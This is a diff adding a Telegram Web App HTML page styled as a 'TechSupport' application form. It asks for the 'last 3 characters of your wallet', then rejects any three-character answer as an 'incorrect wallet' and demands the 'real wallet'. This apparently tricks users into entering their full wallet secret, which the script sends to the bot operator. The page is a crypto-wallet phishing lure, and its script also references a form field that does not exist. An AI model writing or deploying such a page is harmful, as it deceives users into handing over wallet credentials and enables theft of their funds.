@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>TechSupport</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Montserrat:wght@200;500&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 200;
+            color: var(--tg-theme-text-color);
+            background: var(--tg-theme-background-color);
+        }
+
+        #main {
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+        }
+
+        h1{
+            margin-top: 50px;
+            margin-bottom: 10px;
+        }
+
+        img {
+
+            width: 300px;
+            margin: 0 auto;
+        }
+
+        p{
+            width: 350px;
+            margin: 0 auto;
+        }
+
+        button {
+            border: 0;
+            border-radius: 5px;
+            margin-top: 50px;
+            height: 60px;
+            width: 200px;
+            font-size: 20px;
+            font-weight: 500px;
+            cursor: pointer;
+            transition: all 500ms ease;
+            color: var(--tg-theme-button-color);
+            background: var(--tg-theme-button-text-color);
+        }
+
+        button:hover {
+            background: var(--tg-theme-secondary-bg-color);
+            
+        }
+
+        #form {
+            display: none;
+            text-align: center;
+        }
+
+        input {
+            width: 90%;
+            outline: none;
+            margin: 10px 5%;
+            padding: 15px 10px;
+            font-size: 14px;
+            border: 2px solid silver;
+            border-radius: 5px;
+        }
+
+        input:focus {
+            border-color: #db5d5d
+        }
+    </style>
+
+</head>
+<body>
+    <div id="main">
+        <h1>TechSupport</h1>
+        <img src = "pngwing.png">
+        <p></p>
+        <button id="buy"> Submit your application </button>
+    </div>
+    <form id="form"> <!-- Убран лишний одинарный кавычки -->
+        <input type="text" placeholder="last 3 characters of your wallet" id="Name"> <!-- Изменен id с Username на Name -->
+        <input type="text" placeholder="Email" id="Email">
+        <input type="text" placeholder="Message" id="Message">
+        <div id="error"></div>
+        <button id="order">Send</button>
+    </form>
+    
+    <script src = "https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        let tg = window.Telegram.WebApp;
+        let buy = document.getElementById("buy");
+        let order = document.getElementById("order");
+        tg.expand();
+
+        buy.addEventListener("click", () => {
+            document.getElementById("main").style.display = "none";
+            document.getElementById("form").style.display = "block";
+            document.getElementById("user_name").value = tg.initDataUnsafe.user.first_name + " " + tg.initDataUnsafe.user.last_name;
+
+
+        });
+        order.addEventListener("click", () => {
+            document.getElementById("error").innerText = '';
+            let name = document.getElementById("Name").value;
+            let email = document.getElementById("Email").value;
+            let message = document.getElementById("Message").value;
+            if(name.length == 3 ) {
+                document.getElementById("error").innerText = ' incorrect wallet, please enter real wallet'
+                return; 
+            }
+            if(email.length < 5 ) {
+                document.getElementById("error").innerText = ' incorrect email, please enter real email'
+                return; 
+            }
+            let data = {
+                name: name,
+                email: email,
+                message: message
+            }
+
+            tg.sendData(JSON.stringify(data));
+
+
+            tg.close();
+
+        });
+    </script>
+
+</body>
+</html>
